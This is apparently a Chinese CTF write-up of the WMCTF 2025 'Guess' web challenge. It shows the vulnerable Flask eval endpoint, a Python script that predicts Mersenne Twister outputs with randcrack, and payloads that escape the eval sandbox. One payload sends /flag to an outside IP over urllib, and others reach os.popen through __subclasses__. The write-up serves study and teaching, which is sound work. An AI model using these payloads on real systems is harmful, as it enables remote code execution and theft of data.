---
layout: post
title: "WMCTF 2025 Writeup: Guess 题目详解"
date: 2025-09-22 00:00 +0800
categories: [CTF, Web安全]
tags: [Python, Random, RCE, 漏洞复现, 梅森旋转算法]
toc: true
author: GyroJ
---

### 核心逻辑分析

首先，这个题目注册登录谁都会，所以我们直接看关键代码：

```python
import random

rd = random.Random() # 关键点1


@app.post('/api')
def protected_api():

    data = request.get_json()

    key1 = data.get('key')
    
    if not key1:
        return jsonify({'error': 'key are required'}), 400

    key2 = generate_random_string()
    
    if not str(key1) == str(key2):
        return jsonify({
            'message': 'Not Allowed:' + str(key2) ,
        }), 403
    

    payload = data.get('payload')

    if payload:
        eval(payload, {'__builtin__':{}})  # 关键点2
    
    return jsonify({
        'message': 'Access granted',
    })

```

### 预测随机数

如代码所示，这里使用的是 `random` 库的 `random` 函数，这个函数的算法实际上是梅森旋转算法（Mersenne Twister），根据前随机生成的 624 个数字可以预测下一个数字，所以这里我们第一步需要破解随机数。

攻击脚本如下：

```python
import requests, re
from randcrack import RandCrack

url = "http://49.232.42.74:32328/api"
session = "eyJ1c2VyX2lkIjoiMzM5NTYxNzk0MyIsInVzZXJuYW1lIjoiYWRtaW4ifQ.aM62Kg.XvLwMeAsN6Bx2n66X2JejxJZR1E"

with open("number.txt", 'w') as f:
    f.write('')

for _ in range(624):
    response = requests.post(url, headers={'Cookie': session}, 
                             json={"key":123, "payload": 123}, timeout=10)
    msg = response.json().get('message', '')
    match = re.search(r':(\d+)', msg)
    number = match.group(1)
    print(msg, number)
    with open("number.txt", 'a+') as f:
        f.write(number)
        f.write("\n")

rc = RandCrack()

numbers = []
with open("number.txt", 'r') as f:
    numbers = [int(line.strip()) for line in f.readlines()]

for number in numbers:
    rc.submit(number)

key = rc.predict_getrandbits(32)
print(key)

response = requests.post(url, 
                         headers={'Cookie': session}, 
                         json=
                         {
                            "key":key,
                            "payload": """__import__('urllib').request.urlopen("http://47.95.170.101:9999/upload?msg=1"+open('/flag','r').read())"""
                         },
                         timeout=10)
for i in range(5):
    key = rc.predict_getrandbits(32)
    print(key)
print(response.content)
```

### 构造 Payload 命令

这个脚本首先的作用是发送 624 次请求，然后获取返回的 `key2`，也就是生成的随机数，然后预测下一次生成的随机数，匹配成功后就可以注入代码。上面的网页代码中虽然做了过滤，但是实际上是一个无用的过滤，因为 Python 3 已经不适用 `__builtin__`。

这里我们构造的命令注入代码是这样的：

```python
__import__('urllib').request.urlopen("http://外部服务器url/upload?msg=1"+open('/flag','r').read())
```

先读取 flag 的内容，然后使用 Python 的 `urllib` 库函数发送 request 到服务器上接收，接着到外部服务器上直接读取 flag。这是在出网的前提下才能适用的做法。

#### 不出网的解法

这个题目由于权限问题，在使用数据外带的方法之前，尝试过各种方法，比如将 flag 直接写入同级目录下、404 污染、将 flag 写入 `login.html` 文件下等方法，均失败。

首先，构造出可执行系统命令的 lambda 函数，然后创建 `static` 静态文件夹，再将 flag 写入 `static` 文件夹下，之后直接访问 flag 文件就可以了。

Payload 如下：

```python
(lambda o: 
    [
        o.mkdir('static'), 
        open('static/flag','w').write(o.popen('tac /flag').read())
    ]
)(next(
    c.__init__.__globals__['os'] 
    for c in ().__class__.__base__.__subclasses__() 
    if hasattr(c.__init__,'__globals__') 
    and 'os' in c.__init__.__globals__
))
```

事实上可以更加简单，就算是builtin过滤成功的情况下，依然可以使用下面的构造来进行攻击：

首先，先创建文件夹static：
```python
{
"payload":"''.__class__.__base__.__subclasses__()[138].__init__.__globals__['popen']('mkdir -p /app/static').read()"
}
```
然后把flag文件写入static
```python
{
"payload":"''.__class__.__base__.__subclasses__()[138].__init__.__globals__['popen']('cp /flag /app/static/flag.txt').read()"
}
```
最后从网页中访问static/flag.txt